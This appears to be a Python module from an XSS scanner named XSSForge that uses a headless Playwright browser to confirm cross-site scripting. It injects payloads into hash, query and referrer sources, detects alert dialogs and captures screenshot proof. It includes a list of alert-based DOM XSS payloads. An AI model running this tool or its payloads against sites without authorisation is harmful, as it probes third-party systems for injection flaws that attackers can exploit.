"""
Playwright Browser Integration for XSSForge.

Provides headless browser verification for XSS vulnerabilities.
"""

import asyncio
from dataclasses import dataclass, field
from typing import Any, Callable
from urllib.parse import urlparse, urlencode, parse_qs
import base64

try:
    from playwright.async_api import async_playwright, Page, Browser, Dialog
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


@dataclass
class BrowserVerificationResult:
    """Result from browser-based XSS verification."""
    url: str
    payload: str
    executed: bool
    dialog_message: str = ""
    console_messages: list[str] = field(default_factory=list)
    screenshot: bytes | None = None
    error: str = ""
    source_type: str = ""  # hash, search, referrer, etc.


@dataclass
class BrowserConfig:
    """Configuration for browser verification."""
    headless: bool = True
    timeout: int = 5000  # 5 seconds
    screenshot_on_success: bool = True
    browser_type: str = "chromium"  # chromium, firefox, webkit
    user_agent: str | None = None
    proxy: str | None = None
    max_pages: int = 3  # Page pool size for performance


class PlaywrightVerifier:
    """
    Browser-based XSS verification using Playwright.

    Features:
    - Alert/confirm/prompt dialog detection
    - Console message monitoring
    - Screenshot evidence capture
    - Multiple DOM source testing
    - Page pooling for performance
    """

    def __init__(self, config: BrowserConfig | None = None):
        if not PLAYWRIGHT_AVAILABLE:
            raise RuntimeError(
                "Playwright is not installed. "
                "Install with: pip install playwright && playwright install chromium"
            )

        self.config = config or BrowserConfig()
        self._playwright = None
        self._browser: Browser | None = None
        self._page_pool: list[Page] = []
        self._page_semaphore: asyncio.Semaphore | None = None

    async def __aenter__(self):
        await self.start()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.stop()

    async def start(self):
        """Start the browser."""
        self._playwright = await async_playwright().start()

        # Get browser type
        browser_type = getattr(self._playwright, self.config.browser_type, None)
        if not browser_type:
            browser_type = self._playwright.chromium

        # Launch options
        launch_options = {
            "headless": self.config.headless,
        }

        if self.config.proxy:
            launch_options["proxy"] = {"server": self.config.proxy}

        self._browser = await browser_type.launch(**launch_options)
        self._page_semaphore = asyncio.Semaphore(self.config.max_pages)

    async def stop(self):
        """Stop the browser."""
        if self._browser:
            await self._browser.close()
        if self._playwright:
            await self._playwright.stop()

    async def _get_page(self) -> Page:
        """Get a browser page (from pool or create new)."""
        context = await self._browser.new_context(
            user_agent=self.config.user_agent,
            ignore_https_errors=True,
        )
        return await context.new_page()

    async def verify_xss(
        self,
        url: str,
        payload: str,
        source_type: str = "hash",
    ) -> BrowserVerificationResult:
        """
        Verify if an XSS payload executes in the browser.

        Args:
            url: Target URL
            payload: XSS payload to test
            source_type: How to inject payload (hash, search, referrer, name)

        Returns:
            BrowserVerificationResult with execution details
        """
        result = BrowserVerificationResult(
            url=url,
            payload=payload,
            executed=False,
            source_type=source_type,
        )

        async with self._page_semaphore:
            page = await self._get_page()

            try:
                # Track state
                alert_triggered = False
                dialog_message = ""
                console_messages = []

                # Handle dialogs (alert, confirm, prompt)
                async def handle_dialog(dialog: Dialog):
                    nonlocal alert_triggered, dialog_message
                    alert_triggered = True
                    dialog_message = dialog.message
                    await dialog.dismiss()

                page.on("dialog", handle_dialog)

                # Handle console messages
                def handle_console(msg):
                    console_messages.append(f"{msg.type}: {msg.text}")

                page.on("console", handle_console)

                # Construct test URL based on source type
                test_url = self._construct_test_url(url, payload, source_type)

                # Navigate and wait
                await page.goto(test_url, timeout=self.config.timeout)

                # Wait a bit for async XSS to trigger
                await page.wait_for_timeout(1000)

                # Check results
                result.executed = alert_triggered
                result.dialog_message = dialog_message
                result.console_messages = console_messages

                # Take screenshot on success
                if alert_triggered and self.config.screenshot_on_success:
                    result.screenshot = await page.screenshot()

            except Exception as e:
                result.error = str(e)

            finally:
                await page.close()

        return result

    async def verify_reflected_xss(
        self,
        url: str,
        parameter: str,
        payload: str,
    ) -> BrowserVerificationResult:
        """
        Verify reflected XSS by injecting payload in query parameter.

        Args:
            url: Base URL
            parameter: Parameter name to inject into
            payload: XSS payload

        Returns:
            BrowserVerificationResult
        """
        # Parse URL and add/modify parameter
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[parameter] = [payload]

        # Reconstruct URL
        query = urlencode(params, doseq=True)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

        return await self.verify_xss(test_url, payload, source_type="query_param")

    async def verify_dom_xss(
        self,
        url: str,
        payload: str,
    ) -> list[BrowserVerificationResult]:
        """
        Verify DOM XSS by testing multiple sources.

        Tests:
        - location.hash
        - location.search (query params)
        - document.referrer
        - window.name

        Returns:
            List of verification results for each source
        """
        results = []

        # Test hash
        result = await self.verify_xss(url, payload, source_type="hash")
        results.append(result)

        # Test search (generic param)
        result = await self.verify_xss(url, payload, source_type="search")
        results.append(result)

        # Test referrer (if supported)
        # Note: This requires a two-step navigation
        result = await self._test_referrer_xss(url, payload)
        results.append(result)

        return results

    async def _test_referrer_xss(
        self,
        url: str,
        payload: str,
    ) -> BrowserVerificationResult:
        """Test XSS via document.referrer."""
        result = BrowserVerificationResult(
            url=url,
            payload=payload,
            executed=False,
            source_type="referrer",
        )

        async with self._page_semaphore:
            page = await self._get_page()

            try:
                alert_triggered = False
                dialog_message = ""

                async def handle_dialog(dialog: Dialog):
                    nonlocal alert_triggered, dialog_message
                    alert_triggered = True
                    dialog_message = dialog.message
                    await dialog.dismiss()

                page.on("dialog", handle_dialog)

                # First navigate to a page that will set the referrer
                # Create a data URL that redirects
                redirect_html = f'''
                <html>
                <head>
                    <meta http-equiv="refresh" content="0; url={url}">
                </head>
                <body>
                    <script>
                        // Fake referrer via history manipulation
                        history.replaceState(null, '', '{payload}');
                        window.location.href = '{url}';
                    </script>
                </body>
                </html>
                '''
                data_url = f"data:text/html;base64,{base64.b64encode(redirect_html.encode()).decode()}"

                # This approach is limited - referrer XSS is hard to test automatically
                await page.goto(url, timeout=self.config.timeout, referer=payload)
                await page.wait_for_timeout(1000)

                result.executed = alert_triggered
                result.dialog_message = dialog_message

            except Exception as e:
                result.error = str(e)

            finally:
                await page.close()

        return result

    def _construct_test_url(
        self,
        url: str,
        payload: str,
        source_type: str,
    ) -> str:
        """Construct URL with payload injected into specified source."""
        parsed = urlparse(url)

        if source_type == "hash":
            # Inject into URL hash
            return f"{url}#{payload}"

        elif source_type == "search":
            # Inject as query parameter
            params = parse_qs(parsed.query)
            params["xss"] = [payload]
            query = urlencode(params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

        elif source_type == "query_param":
            # URL already has the payload in query
            return url

        else:
            return url

    async def batch_verify(
        self,
        url: str,
        payloads: list[str],
        source_type: str = "hash",
        stop_on_first: bool = True,
    ) -> list[BrowserVerificationResult]:
        """
        Verify multiple payloads in batch.

        Args:
            url: Target URL
            payloads: List of payloads to test
            source_type: Injection source type
            stop_on_first: Stop after first successful execution

        Returns:
            List of verification results
        """
        results = []

        for payload in payloads:
            result = await self.verify_xss(url, payload, source_type)
            results.append(result)

            if stop_on_first and result.executed:
                break

        return results


async def verify_xss_with_browser(
    url: str,
    payload: str,
    source_type: str = "hash",
    config: BrowserConfig | None = None,
) -> BrowserVerificationResult:
    """Convenience function to verify XSS with browser."""
    async with PlaywrightVerifier(config) as verifier:
        return await verifier.verify_xss(url, payload, source_type)


async def verify_dom_xss(
    url: str,
    payload: str,
    config: BrowserConfig | None = None,
) -> list[BrowserVerificationResult]:
    """Convenience function to verify DOM XSS."""
    async with PlaywrightVerifier(config) as verifier:
        return await verifier.verify_dom_xss(url, payload)


# Quick payload verification
DOM_XSS_PAYLOADS = [
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(document.domain)>",
    "javascript:alert(document.domain)",
    "'-alert(document.domain)-'",
    "\";alert(document.domain)//",
    "${alert(document.domain)}",
]


async def quick_dom_xss_test(url: str) -> list[BrowserVerificationResult]:
    """Quick test for DOM XSS with common payloads."""
    results = []

    async with PlaywrightVerifier() as verifier:
        for payload in DOM_XSS_PAYLOADS:
            result = await verifier.verify_xss(url, payload, source_type="hash")
            results.append(result)

            if result.executed:
                # Found one, test other sources too
                search_result = await verifier.verify_xss(url, payload, source_type="search")
                results.append(search_result)
                break

    return results


# ============================================================================
# BrowserVerifier - High-level API matching the plan
# ============================================================================

@dataclass
class VerificationResult:
    """Simplified verification result for XSS confirmation."""
    verified: bool
    alert_text: str = ""
    screenshot: bytes | None = None
    url: str = ""
    payload: str = ""
    error: str = ""


class BrowserVerifier:
    """
    High-level browser verification class.

    Verifies XSS by detecting JavaScript dialog execution.

    Usage:
        verifier = BrowserVerifier()
        result = await verifier.verify("https://example.com?q=<script>alert(1)</script>", "<script>alert(1)</script>")
        if result.verified:
            print(f"XSS confirmed! Alert text: {result.alert_text}")
            # result.screenshot contains PNG proof
    """

    def __init__(
        self,
        headless: bool = True,
        timeout: int = 5000,
        screenshot_on_success: bool = True,
        browser_type: str = "chromium",
        proxy: str | None = None,
    ):
        self.config = BrowserConfig(
            headless=headless,
            timeout=timeout,
            screenshot_on_success=screenshot_on_success,
            browser_type=browser_type,
            proxy=proxy,
        )
        self._verifier: PlaywrightVerifier | None = None

    async def __aenter__(self):
        self._verifier = PlaywrightVerifier(self.config)
        await self._verifier.start()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._verifier:
            await self._verifier.stop()

    async def verify(self, url: str, payload: str) -> VerificationResult:
        """
        Verify if XSS payload executes in browser.

        Args:
            url: URL with payload already injected
            payload: The payload that was injected (for reference)

        Returns:
            VerificationResult with verification status and evidence
        """
        if not self._verifier:
            raise RuntimeError("BrowserVerifier not started. Use 'async with' context.")

        result = await self._verifier.verify_xss(url, payload, source_type="query_param")

        return VerificationResult(
            verified=result.executed,
            alert_text=result.dialog_message,
            screenshot=result.screenshot,
            url=url,
            payload=payload,
            error=result.error,
        )

    async def verify_reflected(
        self,
        base_url: str,
        param: str,
        payload: str
    ) -> VerificationResult:
        """
        Verify reflected XSS by injecting payload into parameter.

        Args:
            base_url: Target URL without payload
            param: Parameter name to inject into
            payload: XSS payload

        Returns:
            VerificationResult
        """
        if not self._verifier:
            raise RuntimeError("BrowserVerifier not started. Use 'async with' context.")

        result = await self._verifier.verify_reflected_xss(base_url, param, payload)

        return VerificationResult(
            verified=result.executed,
            alert_text=result.dialog_message,
            screenshot=result.screenshot,
            url=result.url,
            payload=payload,
            error=result.error,
        )

    async def verify_batch(
        self,
        url: str,
        param: str,
        payloads: list[str],
        stop_on_first: bool = True
    ) -> list[VerificationResult]:
        """
        Verify multiple payloads.

        Args:
            url: Base URL
            param: Parameter to inject
            payloads: List of payloads to try
            stop_on_first: Stop after first successful verification

        Returns:
            List of verification results
        """
        results = []

        for payload in payloads:
            result = await self.verify_reflected(url, param, payload)
            results.append(result)

            if stop_on_first and result.verified:
                break

        return results


# ============================================================================
# Synchronous Wrappers
# ============================================================================

def verify_xss_sync(
    url: str,
    payload: str,
    headless: bool = True,
    timeout: int = 5000,
) -> VerificationResult:
    """
    Synchronous XSS verification.

    Args:
        url: URL with payload injected
        payload: The XSS payload
        headless: Run browser headlessly
        timeout: Timeout in milliseconds

    Returns:
        VerificationResult
    """
    async def _run():
        async with BrowserVerifier(headless=headless, timeout=timeout) as verifier:
            return await verifier.verify(url, payload)

    return asyncio.run(_run())


def verify_reflected_xss_sync(
    base_url: str,
    param: str,
    payload: str,
    headless: bool = True,
    timeout: int = 5000,
) -> VerificationResult:
    """
    Synchronous reflected XSS verification.

    Args:
        base_url: Target URL
        param: Parameter name
        payload: XSS payload
        headless: Run browser headlessly
        timeout: Timeout in milliseconds

    Returns:
        VerificationResult
    """
    async def _run():
        async with BrowserVerifier(headless=headless, timeout=timeout) as verifier:
            return await verifier.verify_reflected(base_url, param, payload)

    return asyncio.run(_run())


# ============================================================================
# Check if Playwright is available
# ============================================================================

def is_browser_available() -> bool:
    """Check if browser verification is available."""
    return PLAYWRIGHT_AVAILABLE


def get_browser_status() -> str:
    """Get status message about browser availability."""
    if PLAYWRIGHT_AVAILABLE:
        return "Playwright available - browser verification enabled"
    return "Playwright not installed - install with: pip install playwright && playwright install chromium"
